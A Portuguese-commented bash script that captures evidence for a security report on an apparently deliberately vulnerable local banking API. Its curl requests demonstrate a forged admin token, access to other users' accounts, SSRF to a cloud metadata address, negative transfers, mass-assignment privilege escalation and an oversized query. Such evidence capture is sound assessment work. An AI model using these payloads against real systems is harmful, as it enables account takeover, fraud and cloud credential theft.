#!/usr/bin/env bash
# Reproduz as evidências do relatório contra a aplicação recém-iniciada.
#
# Uso:
#   java -jar target/brecha-1.0.0.jar &      # sobe em 127.0.0.1:8080
#   bash docs/evidencias/capturar.sh
#
# A ordem importa: as leituras vêm antes dos ataques que mudam o banco, para
# cada evidência mostrar o estado que o achado descreve. Tokens viram
# marcadores e o hash de senha sai mascarado.
set -euo pipefail

B="${BRECHA_URL:-http://127.0.0.1:8080}"
E="$(cd "$(dirname "$0")" && pwd)"
J='Content-Type: application/json'

token() {
  curl -s -X POST "$B/$1/sessoes" -H "$J" -d "{\"email\":\"$2\",\"senha\":\"$3\"}" \
    | sed -n 's/.*"token":"\([^"]*\)".*/\1/p'
}

mascarar() {
  sed -E 's/("senhaHash":")([A-Za-z0-9+\/=]{6})[^"]*"/\1\2...(mascarado)"/g' | tr -d '\r'
}

# capturar <achado> <comando mostrado> <argumentos do curl...>
capturar() {
  local arquivo="$E/$1.txt" mostrado="$2"
  shift 2
  { printf '$ %s\n' "$mostrado"; curl -s -i "$@" | mascarar; printf '\n\n'; } >> "$arquivo"
}

for n in 1 2 3 4 5 6 7 8 9; do : > "$E/BRECHA-00$n.txt"; done

A1=$(token v1 ana@exemplo.com.br ana-senha-2026)
A2=$(token v2 ana@exemplo.com.br ana-senha-2026)
FORJADO=$(printf '3:ADMIN' | base64 | tr '+/' '-_' | tr -d '=')
H1="Authorization: Bearer $A1"
H2="Authorization: Bearer $A2"
T1="'Authorization: Bearer <token da Ana, v1>'"
T2="'Authorization: Bearer <token da Ana, v2>'"

# Leituras
capturar BRECHA-009 "curl -i $B/v0/clientes" "$B/v0/clientes"
capturar BRECHA-001 "curl -i -H $T1 $B/v1/contas/200" -H "$H1" "$B/v1/contas/200"
capturar BRECHA-001 "curl -i -H $T2 $B/v2/contas/200" -H "$H2" "$B/v2/contas/200"
capturar BRECHA-002 "curl -i -H 'Authorization: Bearer $FORJADO' $B/v1/admin/clientes   # base64 de 3:ADMIN" \
  -H "Authorization: Bearer $FORJADO" "$B/v1/admin/clientes"
capturar BRECHA-002 "curl -i -H 'Authorization: Bearer $FORJADO' $B/v2/admin/clientes" \
  -H "Authorization: Bearer $FORJADO" "$B/v2/admin/clientes"
capturar BRECHA-003 "curl -i -H $T1 $B/v1/clientes/me" -H "$H1" "$B/v1/clientes/me"
capturar BRECHA-003 "curl -i -H $T2 $B/v2/clientes/me" -H "$H2" "$B/v2/clientes/me"
capturar BRECHA-004 "curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}' -H $T1 '$B/v1/contas/100/extrato?dias=2000000'" \
  -o /dev/null -w "HTTP %{http_code}, %{size_download} bytes em %{time_total}s\n" -H "$H1" "$B/v1/contas/100/extrato?dias=2000000"
capturar BRECHA-004 "curl -i -H $T2 '$B/v2/contas/100/extrato?dias=2000000'" -H "$H2" "$B/v2/contas/100/extrato?dias=2000000"
capturar BRECHA-005 "curl -i -H $T1 $B/v1/admin/clientes" -H "$H1" "$B/v1/admin/clientes"
capturar BRECHA-005 "curl -i -H $T2 $B/v2/admin/clientes" -H "$H2" "$B/v2/admin/clientes"
capturar BRECHA-007 "curl -i -X POST -H $T1 -H '$J' -d '{\"url\":\"http://127.0.0.1:8080/v0/clientes\"}' $B/v1/comprovantes/importar" \
  -X POST -H "$H1" -H "$J" -d '{"url":"http://127.0.0.1:8080/v0/clientes"}' "$B/v1/comprovantes/importar"
capturar BRECHA-007 "curl -i -X POST -H $T2 -H '$J' -d '{\"url\":\"https://169.254.169.254/latest/meta-data/\"}' $B/v2/comprovantes/importar" \
  -X POST -H "$H2" -H "$J" -d '{"url":"https://169.254.169.254/latest/meta-data/"}' "$B/v2/comprovantes/importar"
capturar BRECHA-008 "curl -i -H $T1 $B/v1/contas/999999" -H "$H1" "$B/v1/contas/999999"
capturar BRECHA-008 "curl -i -H $T2 $B/v2/contas/999999" -H "$H2" "$B/v2/contas/999999"

# Ataques que mudam o estado
capturar BRECHA-001 "curl -i -X POST -H $T1 -H '$J' -d '{\"origem\":200,\"destino\":100,\"valor\":1000}' $B/v1/transferencias" \
  -X POST -H "$H1" -H "$J" -d '{"origem":200,"destino":100,"valor":1000}' "$B/v1/transferencias"
capturar BRECHA-006 "curl -i -X POST -H $T1 -H '$J' -d '{\"origem\":100,\"destino\":200,\"valor\":-3000}' $B/v1/transferencias" \
  -X POST -H "$H1" -H "$J" -d '{"origem":100,"destino":200,"valor":-3000}' "$B/v1/transferencias"
capturar BRECHA-006 "curl -i -X POST -H $T2 -H '$J' -d '{\"destino\":200,\"valor\":-3000}' $B/v2/transferencias" \
  -X POST -H "$H2" -H "$J" -d '{"destino":200,"valor":-3000}' "$B/v2/transferencias"
capturar BRECHA-003 "curl -i -X PATCH -H $T1 -H '$J' -d '{\"perfil\":\"ADMIN\",\"limiteDeCredito\":999999}' $B/v1/clientes/me" \
  -X PATCH -H "$H1" -H "$J" -d '{"perfil":"ADMIN","limiteDeCredito":999999}' "$B/v1/clientes/me"
capturar BRECHA-003 "curl -i -X PATCH -H $T2 -H '$J' -d '{\"perfil\":\"ADMIN\",\"limiteDeCredito\":999999}' $B/v2/clientes/me" \
  -X PATCH -H "$H2" -H "$J" -d '{"perfil":"ADMIN","limiteDeCredito":999999}' "$B/v2/clientes/me"

echo "Evidências gravadas em $E"
